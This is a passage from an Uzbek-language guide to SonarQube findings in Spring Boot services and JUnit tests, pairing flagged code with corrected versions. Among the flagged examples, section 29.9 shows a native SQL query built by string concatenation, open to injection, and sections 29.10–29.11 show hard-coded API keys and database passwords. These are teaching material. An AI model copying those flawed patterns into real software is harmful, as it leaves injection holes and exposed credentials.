    @Id @GeneratedValue
    private Long id;
    private String nomi;

    @Override
    public boolean equals(Object o) {
        // Faqat saqlangan entity lar id bo'yicha teng
        if (!(o instanceof Mahsulot m)) return false;
        return id != null && id.equals(m.id);
    }

    @Override
    public int hashCode() {
        // Doimiy qiymat, id keyin o'rnatilsa ham buzilmaydi
        return Mahsulot.class.hashCode();
    }
}
```

Tavsiya: entity da `equals` ni faqat `id` bo'yicha yoz, `hashCode` ni esa o'zgarmaydigan qiymatga bog'la.

### 29.7 `@OneToMany` da `FetchType.EAGER` va N+1 xavfi

Shikoyat qilinadigan kod:

```java
@Entity
public class Buyurtma {
    // Shikoyat: EAGER kolleksiya
    @OneToMany(mappedBy = "buyurtma", fetch = FetchType.EAGER)
    private List<BuyurtmaQatori> qatorlar = new ArrayList<>();
}
```

Sonar `EAGER` kolleksiyani maintainability shikoyati sifatida belgilaydi, chunki har qanday o'qish avtomatik qo'shimcha so'rov keltiradi. Ro'yxat so'rovida bu N+1 ga aylanadi: yuz buyurtma uchun yuz bitta qo'shimcha so'rov ketadi.

Tuzatilgan kod:

```java
@Entity
public class Buyurtma {
    // Standart LAZY, kerak bo'lganda aniq yuklaymiz
    @OneToMany(mappedBy = "buyurtma", fetch = FetchType.LAZY)
    private List<BuyurtmaQatori> qatorlar = new ArrayList<>();
}

public interface BuyurtmaRepository extends JpaRepository<Buyurtma, Long> {
    @EntityGraph(attributePaths = "qatorlar")
    List<Buyurtma> findByMijozId(Long mijozId);
}
```

Tavsiya: barcha bog'lanishni `LAZY` qoldir va kerak bo'lgan joyda `@EntityGraph` yoki `join fetch` bilan aniq yukla.

### 29.8 Repository metodida barcha qatorlarni olish va sahifalashsiz ishlash

Shikoyat qilinadigan kod:

```java
public List<BuyurtmaJavobi> hammasi() {
    // Shikoyat: cheklovsiz natija
    return buyurtmaRepository.findAll().stream()
            .map(BuyurtmaJavobi::dan)
            .toList();
}
```

Sonar cheklovsiz `findAll()` natijasini xotiraga yig'ishni reliability muammosi deb belgilaydi, ayniqsa natija tashqi so'rovga javob bo'lib ketsa. Jadval o'sgani sari metod sekinlashadi va bir kun `OutOfMemoryError` bilan tugaydi.

Tuzatilgan kod:

```java
public Page<BuyurtmaJavobi> royxat(Pageable pageable) {
    // Sahifa hajmi tashqaridan keladi, lekin cheklangan
    return buyurtmaRepository.findAll(pageable).map(BuyurtmaJavobi::dan);
}
```

```properties
# Sahifa hajmiga qattiq chegara
spring.data.web.pageable.default-page-size=20
spring.data.web.pageable.max-page-size=100
```

Tavsiya: tashqariga chiqadigan har bir ro'yxat `Pageable` qabul qilsin va maksimal sahifa hajmi konfiguratsiyada cheklansin.

### 29.9 Native query da satr birlashtirish

Shikoyat qilinadigan kod:

```sql
-- Kodda shunday qurilgan so'rov
SELECT * FROM buyurtma WHERE holat = 'YANGI' AND mijoz_id = 42 ORDER BY yaratilgan_at
```

```java
public List<Buyurtma> topish(String holat, String tartib) {
    // Shikoyat: SQL satr birlashtirish bilan qurilmoqda
    String sql = "SELECT * FROM buyurtma WHERE holat = '" + holat
            + "' ORDER BY " + tartib;
    return em.createNativeQuery(sql, Buyurtma.class).getResultList();
}
```

Bu `java:S2077` qoidasi, security vulnerability toifasi va eng yuqori jiddiylik. Sonar tashqaridan kelgan qiymat SQL satriga qo'shilayotganini taint tahlili bilan kuzatadi. Parametrga bog'lanmagan har qanday qiymat injection yo'li, `ORDER BY` qismi esa parametr bo'lolmaydi, shuning uchun uni ruxsat etilgan ro'yxat orqali tekshirish kerak.

Tuzatilgan kod:

```java
private static final Set<String> RUXSAT = Set.of("yaratilgan_at", "summa");

public List<Buyurtma> topish(String holat, String tartib) {
    // Tartib ustuni faqat ruxsat ro'yxatidan
    String ustun = RUXSAT.contains(tartib) ? tartib : "yaratilgan_at";
    return em.createNativeQuery(
                    "SELECT * FROM buyurtma WHERE holat = :holat ORDER BY " + ustun,
                    Buyurtma.class)
            .setParameter("holat", holat)
            .getResultList();
}
```

Tavsiya: qiymatni har doim nomli parametr bilan uzat, identifikatorni esa qattiq ruxsat ro'yxatidan tanla.

### 29.10 `@Value` bilan maxfiy ma'lumotni standart qiymat sifatida yozish

Shikoyat qilinadigan kod:

```java
@Service
public class ToLovShlyuzi {
    // Shikoyat: kodda qattiq yozilgan kalit
    @Value("${tolov.api-kalit:sk_live_9f3a21bc77}")
    private String apiKalit;
}
```

Sonar buni `java:S2068` bo'yicha hard-coded credential deb belgilaydi. Standart qiymat qulay ko'rinadi, lekin u git tarixiga tushadi va o'chirilganidan keyin ham tarixda qoladi.

Tuzatilgan kod:

```java
@Service
public class ToLovShlyuzi {
    private final String apiKalit;

    // Standart qiymat yo'q: kalit bo'lmasa kontekst ko'tarilmaydi
    public ToLovShlyuzi(@Value("${tolov.api-kalit}") String apiKalit) {
        this.apiKalit = apiKalit;
    }
}
```

Tavsiya: maxfiy qiymatga standart berma, u yo'q bo'lsa ilova ishga tushmasligi to'g'ri xatti harakat.

### 29.11 Konfiguratsiyada parol va kalitni ochiq saqlash

Shikoyat qilinadigan kod:

```yaml
spring:
  datasource:
    url: jdbc:postgresql://db.prod.internal:5432/buyurtma
    username: buyurtma_app
    # Shikoyat: ochiq parol
    password: Pr0d_Parol_2025
```

Sonar konfiguratsiya faylidagi parolni ham `java:S2068` yoki unga mos secrets qoidasi bilan topadi va ko'pincha `sonar.secrets` tahlili alohida ogohlantirish beradi. Bu qiymat build artifact ichiga kirib ketadi, demak jar ni olgan har kim bazaga ulanadi.

Tuzatilgan kod:

```yaml
spring:
  datasource:
    url: ${DB_URL}
    username: ${DB_USER}
    # Qiymat muhit o'zgaruvchisi yoki secret manager dan keladi
    password: ${DB_PASSWORD}
```

Tavsiya: har qanday credential ni muhit o'zgaruvchisi yoki secret store ga ko'chir, repozitoriyada faqat placeholder qolsin.

### 29.12 Katta `@Configuration` klassi va ortiqcha bean

Shikoyat qilinadigan kod:

```java
@Configuration
public class IlovaKonfiguratsiyasi {
    // Shikoyat: klass juda katta, javobgarlik aralashgan
    @Bean ObjectMapper objectMapper() { return new ObjectMapper(); }
    @Bean RestTemplate restTemplate() { return new RestTemplate(); }
    @Bean DataSource dataSource() { /* ... */ }
    @Bean CacheManager cacheManager() { /* ... */ }
    @Bean TaskExecutor taskExecutor() { /* ... */ }
    // ... yana 30 ta bean
}
```

Sonar bunday klassda bir necha qoidani birga ishga tushiradi: klass hajmi, metodlar soni va ko'pincha ortiqcha `import` bog'liqligi. Yana bir shikoyat Spring Boot allaqachon beradigan bean ni qo'lda qayta e'lon qilish, masalan `ObjectMapper`, chunki bu auto configuration ni jimgina buzadi.

Tuzatilgan kod:

```java
// Har bir mavzu alohida konfiguratsiyada
@Configuration
class TashqiMijozKonfiguratsiyasi {
    @Bean
    RestClient tolovMijozi(RestClient.Builder builder) {
        return builder.baseUrl("https://tolov.internal").build();
    }
}

@Configuration
@EnableCaching
class KeshKonfiguratsiyasi { /* faqat kesh bean lari */ }
```

Tavsiya: konfiguratsiyani mavzu bo'yicha bo'l va Boot auto configuration bergan bean ni qo'lda qayta e'lon qilma.

### 29.13 Istisnolarni controller da umumiy ushlash va ma'lumotni oshkor qilish

Shikoyat qilinadigan kod:

```java
@PostMapping("/tolov")
public ResponseEntity<String> tolov(@RequestBody TolovSorovi s) {
    try {
        return ResponseEntity.ok(tolovServisi.bajar(s).id());
    } catch (Exception e) {
        // Shikoyat: umumiy catch va stack trace javobda
        return ResponseEntity.status(500).body(e.toString());
    }
}
```

Bu yerda `java:S2221` umumiy `Exception` ushlanayotganini aytadi, chunki shu blok `NullPointerException` ni ham biznes xatosi bilan birga yashiradi. Ikkinchi shikoyat ichki ma'lumotni javobga qo'yish, bu security hotspot: xato matni klass nomini, jadval nomini va ba'zan SQL ni oshkor qiladi.

Tuzatilgan kod:

```java
@RestControllerAdvice
class XatoIshlovchi {
    private static final Logger log = LoggerFactory.getLogger(XatoIshlovchi.class);

    @ExceptionHandler(QoldiqYetmadi.class)
    ResponseEntity<XatoJavobi> qoldiq(QoldiqYetmadi e) {
        return ResponseEntity.status(409).body(new XatoJavobi("QOLDIQ_YETMADI"));
    }

    @ExceptionHandler(Exception.class)
    ResponseEntity<XatoJavobi> kutilmagan(Exception e) {
        // Tafsilot faqat log ga, foydalanuvchiga neytral kod
        log.error("Kutilmagan xato", e);
        return ResponseEntity.status(500).body(new XatoJavobi("ICHKI_XATO"));
    }
}
```

Tavsiya: istisnoni `@RestControllerAdvice` da markazlashtir, tafsilotni log ga yoz va mijozga faqat barqaror xato kodini qaytar.

### 29.14 `RestTemplate` yoki `WebClient` ni timeout siz ishlatish

Shikoyat qilinadigan kod:

```java
@Bean
RestTemplate restTemplate() {
    // Shikoyat: timeout sozlanmagan
    return new RestTemplate();
}
```

Sonar bu holatda tashqi chaqiruv uchun timeout belgilanmaganini reliability muammosi sifatida ko'rsatadi, ba'zi profillarda u resurs boshqaruvi qoidalari bilan birga keladi. Standart `RestTemplate` da connect va read timeout cheksiz, demak sekin javob beradigan servis bizning thread larimizni band qiladi.

Tuzatilgan kod:

```java
@Bean
RestClient tolovMijozi(RestClient.Builder builder) {
    var sozlama = new SimpleClientHttpRequestFactory();
    // Ulanish va o'qish uchun aniq chegara
    sozlama.setConnectTimeout(Duration.ofSeconds(2));
    sozlama.setReadTimeout(Duration.ofSeconds(5));
    return builder.requestFactory(sozlama)
            .baseUrl("https://tolov.internal")
            .build();
}
```

Tavsiya: har bir HTTP mijoziga connect va read timeout ni aniq qiymat bilan belgila va uni konfiguratsiyadan boshqar.

### 29.15 Oddiy yondashuv va arxitektor yondashuvi

| Holat | Oddiy yondashuv | Arxitektor yondashuvi |
|---|---|---|
| Field injection shikoyati | Qoidani profil dan o'chirish | Konstruktor injection ni ArchUnit testi bilan majburlash |
| Singleton holati | `synchronized` qo'shish | Holatni metod lokaliga ko'chirish, bean stateless qolishi |
| Controller murakkabligi | Metodni ikkiga bo'lish | Qarorni domen servisiga ko'chirish va unit test bilan yopish |
| Entity API da | `@JsonIgnore` qo'shish | Har bir endpoint uchun alohida javob `record` i |
| Cheklovsiz `findAll` | Qo'lda `limit` qo'shish | `Pageable` ni shartnomaga kiritish va max hajmni cheklash |
| Native query | Qiymatni `replace` bilan tozalash | Nomli parametr va identifikator uchun ruxsat ro'yxati |
| Ochiq parol | `.gitignore` ga fayl qo'shish | Secret store, kalit rotatsiyasi va CI da secrets tahlili |
| Umumiy `catch` | `Exception` o'rniga `Throwable` yozish | Aniq istisno ierarxiyasi va markazlashgan `@RestControllerAdvice` |

### 29.16 Tuzoq va yechim

| Tuzoq | Nega yuzaga keladi | Yechim |
|---|---|---|
| Shikoyat `Won't fix` bilan yopiladi | Tuzatish vaqt talab qiladi | Faqat haqiqiy false positive ga `Won't fix`, qolganiga issue |
| Qoida profil dan o'chiriladi | Bitta klass noqulaylik tug'diradi | Qoidani saqlab, faqat generatsiya qilingan kodni exclusion ga qo'y |
| Yangi kod uchun quality gate o'tadi, lekin eski kod chirik | Gate faqat new code ni o'lchaydi | Eski kodga alohida texnik qarz backlog i |
| Security hotspot e'tiborsiz qoladi | U gate ni har doim buzmaydi | Har bir hotspot ni review qilib, sabab bilan yop |
| Timeout qo'shilgach test sekinlashadi | Timeout qiymati testda ham ishlaydi | Test profilida kichik timeout, WireMock bilan kechikishni simulyatsiya qil |

Generatsiya qilingan yoki migratsiya kodini chiqarib tashlash kerak bo'lsa, buni qoidani o'chirmasdan `pom.xml` da aniq qil:

```xml
<properties>
  <!-- Faqat generatsiya qilingan klasslar tahlildan chiqariladi -->
  <sonar.exclusions>
    **/generated/**,**/*MapperImpl.java
  </sonar.exclusions>
  <!-- Entity larda coverage o'lchanmasin, mantiq yo'q -->
  <sonar.coverage.exclusions>
    **/domain/*Entity.java
  </sonar.coverage.exclusions>
</properties>
```

Tahlilni lokal yurgizib, natijani gate bo'yicha tekshir:

```bash
# Avval test va coverage, keyin tahlil
./mvnw clean verify
./mvnw sonar:sonar \
  -Dsonar.projectKey=buyurtma-servisi \
  -Dsonar.host.url="$SONAR_HOST_URL" \
  -Dsonar.token="$SONAR_TOKEN"
# Natijani gate bo'yicha tekshirish
curl -s -u "$SONAR_TOKEN": \
  "$SONAR_HOST_URL/api/qualitygates/project_status?projectKey=buyurtma-servisi"
```

### 29.17 Amalda qo'llash

- [ ] Loyihadagi barcha maydon `@Autowired` larni konstruktor injection ga ko'chir va shu qoidani ArchUnit testi bilan muhrla.
- [ ] Har bir `@Service` klassini ko'rib chiq va `final` bo'lmagan holat maydonlarini metod lokaliga ko'chir.
- [ ] `@Transactional` ni `grep` bilan topib, `private` yoki ichki chaqiriladigan metoddagi har bir holatni tuzat.
- [ ] Barcha `FetchType.EAGER` ni `LAZY` ga o'zgartir va kerakli joyga `@EntityGraph` qo'sh.
- [ ] Tashqariga chiqadigan har bir ro'yxat metodiga `Pageable` kirit va `max-page-size` ni konfiguratsiyada chekla.
- [ ] Native query larni ko'rib chiq, qiymatlarni nomli parametrga, `ORDER BY` ni ruxsat ro'yxatiga o'tkaz.
- [ ] Konfiguratsiya va `@Value` dagi har bir credential ni muhit o'zgaruvchisiga ko'chir, keyin kalitlarni rotatsiya qil.
- [ ] Har bir HTTP mijoziga connect va read timeout belgilab, test profilida kichik qiymat bilan tekshir.

## 30. Xato katalogi: test kodidagi xatolar (Catalog: Test Code)

Sonar test kodini ham production kod kabi tahlil qiladi, lekin boshqa qoida to'plamini qo'llaydi. Asosiy savol "bu metod ishlaydimi" emas, balki "bu test haqiqatan biror narsani tekshiradimi". Quyidagi katalog test kodida eng ko'p uchraydigan shikoyatlarni, toifasini va tuzatilgan variantini yig'adi. Jiddiylik "taxminan", chunki u quality profile sozlamasiga qarab o'zgaradi.

| Kod holati | Sonar nima deydi | Toifa | Jiddiylik (taxminan) | Ta'siri |
| --- | --- | --- | --- | --- |
| Test metodi assertion chaqirmaydi | `java:S2699`: test assertion o'z ichiga olishi kerak | maintainability (code smell) | Blocker | Test qizil bo'lmaydi, coverage o'sadi |
| `try { ... fail(); } catch (Ex e) {}` | eskirgan usul, `assertThrows` tavsiya qilinadi | maintainability (code smell) | Major | Noto'g'ri joyda tashlangan istisno ham testni o'tkazadi |
| `assertThrows` lambdasida bir nechta chaqiruv | `java:S5778`: faqat bitta metod chaqirig'i kutiladi | maintainability (code smell) | Major | Qaysi chaqiruv istisno tashlaganini bilib bo'lmaydi |
| `@Disabled` izohsiz qoldirilgan | `java:S1607`: tuzatilishi yoki olib tashlanishi kerak | maintainability (code smell) | Major | Yashirin regressiya, sababi esda qolmaydi |
| `Thread.sleep(2000)` test ichida | `java:S2925`: testda `Thread.sleep` ishlatilmasin | reliability (bug) | Critical | Flaky test va sekin CI |
| `static` o'zgaruvchan maydonga yozish | `java:S2696`: instance metod static maydonga yozmasin | reliability (bug) | Major | Testlar bajarilish tartibiga bog'lanadi |
| `void test1()` kabi nomlar | `java:S100`: metod nomi konventsiyaga mos bo'lsin | maintainability (code smell) | Minor | Buzilgan test nimani anglatishini hisobot ko'rsatmaydi |
| Kutilgan natija `BigDecimal("1187.5")` | `java:S109`: magic number izohlanmagan | maintainability (code smell) | Minor | Qoida o'zgarganda raqam manbasi noma'lum |
| Har testda takrorlangan setup | duplicated blocks, duplication density o'sadi | maintainability (code smell) | Major | Gate ning duplication sharti buziladi |
| Bitta testda 20 dan ortiq assertion | `java:S5961`: testda juda ko'p assertion | maintainability (code smell) | Major | Birinchi xato qolganini yashiradi |
| `...Test` klassida test metodi yo'q | `java:S2187`: test klassi test o'z ichiga olishi kerak | maintainability (code smell) | Blocker | Fayl test deb o'qiladi, hech narsa bajarilmaydi |
| `assertThat(total)` oxirigacha yozilmagan | `java:S2970`: assertion tugallanmagan | reliability (bug) | Blocker | Shart tekshirilmaydi, test doim yashil |
| `assertTrue(true)` yoki `assertNotNull(new Order())` | `java:S2701` va o'xshash qoidalar | maintainability (code smell) | Major | Soxta tekshiruv, aslida assertion yo'q |
| Faqat metodni chaqiradigan coverage testi | `java:S2699`, coverage ko'rsatkichi buziladi | maintainability (code smell) | Blocker | Coverage raqami haqiqatdan uzoqlashadi |

### 30.1 Assertion siz test metodi

Eng ko'p uchraydigan shikoyat shu: test servisni chaqiradi, natijani o'zgaruvchiga yozadi va tugaydi.

```java
@Test
void calculateTotal() {
    Order order = new Order(List.of(new Item("SKU-1", 2, new BigDecimal("500"))));
    // natija olinadi, lekin tekshirilmaydi
    BigDecimal total = paymentCalculator.calculateTotal(order);
    System.out.println(total); // konsolga chiqarish assertion emas
}
```

Sonar `java:S2699` bo'yicha shikoyat qiladi: metodda `@Test` izohi bor, lekin tanilgan assertion kutubxonalaridan birortasi ham chaqirilmagan. `System.out.println` assertion deb hisoblanmaydi. Bunday test faqat istisno tashlanganda qizil bo'ladi. JaCoCo esa o'sha qatorlarni qoplangan deb belgilaydi: coverage o'sadi, ishonch o'smaydi.

```java
@Test
void calculateTotal_qqs_bilan_yakuniy_summani_qaytaradi() {
    Order order = new Order(List.of(new Item("SKU-1", 2, new BigDecimal("500"))));

    BigDecimal total = paymentCalculator.calculateTotal(order);

    // 1000 asosiy summa, 12 foiz QQS qo'shiladi
    assertThat(total).isEqualByComparingTo("1120.00");
}
```

Tavsiya: har bir `@Test` metodi kamida bitta aniq assertion bilan tugashi kerak. Bunday shikoyatlar sonini tahlildan keyin filtr bilan sanash mumkin.

```bash
# faqat test fayllaridagi issue larni qoida bo'yicha guruhlab ko'rish
curl -s -u "$SONAR_TOKEN:" \
  "http://sonar.internal:9000/api/issues/search?componentKeys=payment-service&scopes=TEST&ps=100" \
  | jq -r '.issues[].rule' | sort | uniq -c | sort -rn
```

### 30.2 Istisnoni try-catch bilan tekshirish va assertThrows ga o'tish

JUnit 4 davrida keng tarqalgan usul JUnit 5 da code smell bo'lib qoldi.

```java
@Test
void insufficientStock() {
    try {
        inventoryService.reserve("SKU-1", 100); // omborda 3 dona bor
        fail("istisno kutilgan edi");
    } catch (InsufficientStockException e) {
        // bo'sh blok, xabar ham tekshirilmaydi
    }
}
```

Sonar bu yerda ikki narsadan shikoyat qiladi: bo'sh `catch` bloki va usulning o'zi. JUnit 5 da `assertThrows` bor, shuning uchun `try` va `fail` kombinatsiyasi keraksiz murakkablik hisoblanadi. Amaliy xavf ham bor: agar `reserve` noto'g'ri SKU formati uchun shu istisnoni tashlasa, test baribir yashil bo'ladi.

```java
@Test
void reserve_qoldiq_yetmaganda_istisno_tashlaydi() {
    // omborda faqat 3 dona bor, 100 dona so'raladi
    InsufficientStockException ex = assertThrows(
            InsufficientStockException.class,
            () -> inventoryService.reserve("SKU-1", 100));

    assertThat(ex.getMessage()).contains("SKU-1").contains("3");
    assertThat(inventoryService.available("SKU-1")).isEqualTo(3); // holat o'zgarmadi
}
```

Tavsiya: istisnoni `assertThrows` bilan tuting va qaytgan obyektning xabarini ham tekshirib, testni aniq sababga bog'lang.

### 30.3 Juda keng qamrovli assertThrows bloki

`assertThrows` ga o'tish yetarli emas, lambda ichiga nima yozilgani ham muhim.

```java
@Test
void orderFlowFails() {
    assertThrows(IllegalStateException.class, () -> {
        Order order = orderService.create("CUST-7");     // bu ham tashlashi mumkin
        orderService.pay(order.getId(), new BigDecimal("1120"));
        orderService.ship(order.getId());                // asl maqsad shu
    });
}
```

`java:S5778` aytadi: istisno kutilayotgan blokda bitta chaqiruv qolishi kerak. Yuqoridagi testda uchta chaqiruvdan qaysi biri istisno tashlagani ma'lum emas. Agar `create` validatsiya qo'shib `IllegalStateException` tashlasa, test yashil qoladi, ammo `ship` mantiqini tekshirmaydi.

```java
@Test
void ship_tolanmagan_buyurtmada_istisno_tashlaydi() {
    Order order = orderService.create("CUST-7");   // tayyorlash qismi lambdadan tashqarida

    IllegalStateException ex = assertThrows(
            IllegalStateException.class,
            () -> orderService.ship(order.getId()));  // faqat tekshirilayotgan chaqiruv

    assertThat(ex.getMessage()).contains("NEW");
    assertThat(orderService.find(order.getId()).getStatus()).isEqualTo(OrderStatus.NEW);
}
```

Tavsiya: tayyorlash qadamlarini lambdadan tashqariga chiqarib, blokda bitta chaqiruv qoldiring.

### 30.4 @Disabled qoldirilgan test va sababsiz o'chirish

O'chirilgan test vaqtinchalik qaror bo'lib tug'iladi va doimiy qarz bo'lib qoladi.

```java
@Test
@Disabled   // sabab yo'q, qachondan beri o'chiq ekani ham ma'lum emas
void refund_qismiy_qaytarishni_hisoblaydi() {
    assertThat(paymentCalculator.refund(order, new BigDecimal("300")))
            .isEqualByComparingTo("336.00");
}
```

`java:S1607` o'chirilgan testni ko'rsatadi va uni tuzatishni yoki olib tashlashni talab qiladi. Sonar uchun bu code smell: bajarilmaydigan, lekin saqlanayotgan mantiq bor. Amalda yomoni boshqa: o'sha test qoplagan qatorlar coverage dan chiqadi va new code coverage pasayadi.

```yaml
# CI da o'chirilgan testlar sonini kuzatish, ular sezdirmay ko'paymasligi uchun
- name: Disabled testlarni sanash
  run: |
    COUNT=$(grep -rcE "@Disabled|@Ignore" src/test/java | awk -F: '{s+=$2} END {print s+0}')
    echo "O'chirilgan testlar: $COUNT"
    # kelishilgan chegaradan oshsa, build ni to'xtatamiz
    if [ "$COUNT" -gt 5 ]; then
      echo "Chegaradan oshdi, avval mavjudlarini tuzatish kerak" >&2
      exit 1
    fi
```

Tavsiya: `@Disabled` ga sabab va ticket raqamini yozing, sonini CI da chegaralang va eskilarini sprint rejasiga qo'shing.

### 30.5 Thread.sleep bilan kutish va uni almashtirish

Asinxron kodni tekshirishda birinchi xayolga kelgan yechim eng yomoni.

```java
@Test
void tolov_tasdiqlangandan_keyin_buyurtma_PAID_bolishi_kerak() throws Exception {
    paymentGateway.confirmAsync("PAY-42");
    Thread.sleep(2000); // webhook kelishini kutamiz
    assertThat(orderService.find("ORD-42").getStatus()).isEqualTo(OrderStatus.PAID);
}
```

`java:S2925` testda `Thread.sleep` ni reliability muammosi deb belgilaydi. Sabab oddiy: kutish vaqti hech qachon to'g'ri bo'lmaydi. Sekin CI agentida 2 sekund yetmaydi va test flaky bo'ladi, tez mashinada vaqt behuda ketadi. Yechim shartni davriy tekshiradigan kutish, masalan Awaitility.

```java
@Test
void tolov_tasdiqlangandan_keyin_buyurtma_PAID_bolishi_kerak() {
    paymentGateway.confirmAsync("PAY-42");

    // shart bajarilishi bilan davom etadi, kutish vaqti faqat yuqori chegara
    await().atMost(Duration.ofSeconds(5))
           .pollInterval(Duration.ofMillis(100))
           .untilAsserted(() -> assertThat(orderService.find("ORD-42").getStatus())
                   .isEqualTo(OrderStatus.PAID));
}
```

Tavsiya: belgilangan vaqt kutish o'rniga shartni poll qiladigan kutishni ishlatib, timeout ni himoya chegarasi qilib qoldiring.

### 30.6 Testlar orasida umumiy o'zgaruvchan holat

Bu xato Sonar hisobotida ikki xil qoida ostida chiqadi.

```java
class InventoryServiceTest {
    // barcha testlar shu bitta ro'yxatni bo'lishadi
    private static final Map<String, Integer> STOCK = new HashMap<>();

    @Test
    void reserve_qoldiqni_kamaytiradi() {
        STOCK.put("SKU-1", 10);            // static maydonga yozish
        inventoryService.reserve("SKU-1", 4);
        assertThat(STOCK.get("SKU-1")).isEqualTo(6);
    }

    @Test
    void release_qoldiqni_qaytaradi() {
        // avvalgi testdan qolgan qiymatga ishonadi
        inventoryService.release("SKU-1", 2);
        assertThat(STOCK.get("SKU-1")).isEqualTo(8);
    }
}
```

Sonar instance metoddan static o'zgaruvchan maydonga yozishni `java:S2696` bo'yicha belgilaydi. Muammoning mohiyati test izolyatsiyasi: ikkinchi test birinchisining natijasiga tayanadi. JUnit 5 metod tartibini kafolatlamaydi, parallel bajarishda esa ikki test o'sha `Map` ni bir vaqtda o'zgartiradi. Natija kutilmagan qizil yoki undan yomoni kutilmagan yashil.

```java
class InventoryServiceTest {
    private Map<String, Integer> stock;   // static emas, har test uchun yangi

    @BeforeEach
    void setUp() {
        stock = new HashMap<>(Map.of("SKU-1", 10));
        inventoryService = new InventoryService(new InMemoryStockRepository(stock));
    }

    @Test
    void reserve_qoldiqni_kamaytiradi() {
        inventoryService.reserve("SKU-1", 4);
        assertThat(stock.get("SKU-1")).isEqualTo(6);
    }
}
```

Tavsiya: holatni `@BeforeEach` da noldan tiklang va o'zgaruvchan `static` maydonlarni test klassidan olib tashlang.

### 30.7 Test metodining ma'nosiz nomi

Nom testning hisobotdagi yuzi: buzilganda siz birinchi shu satrni ko'rasiz.

```java
@Test void test1() { /* ... */ }
@Test void testCalculate() { /* ... */ }
@Test void TolovTest_2() { /* ... */ }   // konventsiyaga ham mos emas
```

Uchinchi nom `java:S100` ni buzadi, chunki Java metod nomi kichik harf bilan boshlanadi. Birinchi ikkitasi qoida kalitiga tushmasligi mumkin, lekin review darajasida xuddi shunday xato: `test1` buzilganda hisobot hech narsa aytmaydi. Yaxshi nom uchta narsani bildiradi: nima, qanday sharoitda va qanday natija.

```java
@Test
void calculateTotal_chegirma_kodi_amal_qilmasa_toliq_summani_qaytaradi() { /* ... */ }

@Test
void reserve_qoldiq_nolga_teng_bolganda_istisno_tashlaydi() { /* ... */ }

@DisplayName("Buyurtma PAID holatidan CANCELLED ga o'tmaydi")
@Test
void cancel_tolangan_buyurtmani_bekor_qilmaydi() { /* ... */ }
```

Tavsiya: nomni "metod_shart_natija" shaklida yozing, murakkab holatni `@DisplayName` bilan to'ldiring.

### 30.8 Testda magic number va tushunarsiz ma'lumot

To'lov hisoblashda raqamlar ko'p va ularning kelib chiqishi tez yo'qoladi.

```java
@Test
void calculateTotal_hammasini_hisoblaydi() {
    Order order = new Order("ORD-1", 3, new BigDecimal("450.00"));
    order.applyDiscount(new BigDecimal("0.15"));
    // bu raqam qanday chiqdi, hech kim bilmaydi
    assertThat(paymentCalculator.calculateTotal(order))
            .isEqualByComparingTo(new BigDecimal("1285.20"));
}
```

`java:S109` izohlanmagan sonli konstantalarni belgilaydi va ko'p profilda bu qoida test fayllariga ham qo'llanadi. Asl muammo kengroq: `1285.20` qayerdan chiqqanini test tushuntirmaydi. QQS stavkasi o'zgarganda yangi developer raqamni qayta hisoblashni bilmaydi va testni shunchaki yangi natijaga moslashtiradi. Shu paytda test regressiyani ushlash qobiliyatini yo'qotadi.

```java
private static final BigDecimal BIRLIK_NARXI = new BigDecimal("450.00");
private static final int MIQDOR = 3;
private static final BigDecimal CHEGIRMA = new BigDecimal("0.15"); // 15 foiz aksiya
private static final BigDecimal QQS = new BigDecimal("0.12");

@Test
void calculateTotal_chegirma_va_qqs_ni_ketma_ket_qollaydi() {
    Order order = new Order("ORD-1", MIQDOR, BIRLIK_NARXI);
    order.applyDiscount(CHEGIRMA);

    BigDecimal kutilgan = BIRLIK_NARXI.multiply(BigDecimal.valueOf(MIQDOR))
            .multiply(BigDecimal.ONE.subtract(CHEGIRMA))
            .multiply(BigDecimal.ONE.add(QQS))
            .setScale(2, RoundingMode.HALF_UP);

    assertThat(paymentCalculator.calculateTotal(order)).isEqualByComparingTo(kutilgan);
}
```

Ehtiyot bo'ling: kutilgan natijani formula bilan hisoblash tekshirilayotgan mantiqni takrorlash xavfini tug'diradi. Murakkab qoidalar uchun qiymatni konstanta qilib, izohda manbasini ko'rsatish afzal.

Tavsiya: har bir raqamga nom bering, izohda biznes manbasini ko'rsating va formulani testda takrorlamang.

### 30.9 Takrorlangan tayyorlash kodi va uni yagona joyga chiqarish

Duplication alohida ko'rsatkich va test kodi uni tez buzadi.

```java
@Test
void tolov_muvaffaqiyatli() {
    Customer c = new Customer("CUST-7", "Toshkent", Tier.GOLD);
    Order o = new Order("ORD-1", c);
    o.addItem(new Item("SKU-1", 2, new BigDecimal("500")));
    o.addItem(new Item("SKU-2", 1, new BigDecimal("250")));
    o.setStatus(OrderStatus.NEW);
    // ... shu olti qator yana sakkiz testda aynan takrorlanadi
}
```

Sonar bir xil tuzilgan bloklarni duplicated blocks deb belgilaydi va `Duplicated Lines (%)` ni oshiradi. Agar gate da new code uchun duplication chegarasi bo'lsa, faqat test fayllari sababli build qizil bo'ladi. `"CUST-7"` kabi literal uch marta uchrasa `java:S1192` ham qo'shiladi.

```java
// test uchun yagona manba, faqat kerakli maydon o'zgartiriladi
final class OrderMother {
    static Order goldMijozBuyurtmasi() {
        Customer c = new Customer("CUST-7", "Toshkent", Tier.GOLD);
        Order o = new Order("ORD-1", c);
        o.addItem(new Item("SKU-1", 2, new BigDecimal("500")));
        o.addItem(new Item("SKU-2", 1, new BigDecimal("250")));
        return o;
    }
}

@Test
void calculateTotal_gold_mijozga_chegirma_qollaydi() {
    Order order = OrderMother.goldMijozBuyurtmasi();
    assertThat(paymentCalculator.calculateTotal(order)).isEqualByComparingTo("1260.00");
}
```

Integratsion testlarda shu rolni umumiy fixture fayli bajaradi.

```sql
-- src/test/resources/fixtures/ombor.sql, barcha integratsion testlar uchun yagona boshlang'ich holat
TRUNCATE TABLE stock_movement, stock_balance RESTART IDENTITY CASCADE;

INSERT INTO stock_balance (sku, warehouse, quantity) VALUES
  ('SKU-1', 'TOSHKENT-1', 10),   -- yetarli qoldiq holati
  ('SKU-2', 'TOSHKENT-1', 0),    -- qoldiq tugagan holat
  ('SKU-3', 'SAMARQAND-1', 3);   -- chegaraga yaqin holat

INSERT INTO orders (id, customer_id, status, total) VALUES
  ('ORD-1', 'CUST-7', 'NEW', 1260.00);
```

Tavsiya: takrorlangan tayyorlashni builder yoki fixture fayliga chiqarib, testda faqat o'ziga xos farqni qoldiring.

### 30.10 Bir testda juda ko'p assertion va aralash maqsad

Bitta test butun jarayonni qamrasa, buzilganda sabab noaniq bo'ladi.

```java
@Test
void buyurtma_jarayoni() {
    Order o = orderService.create("CUST-7");
    assertThat(o.getStatus()).isEqualTo(OrderStatus.NEW);
    assertThat(o.getItems()).isEmpty();
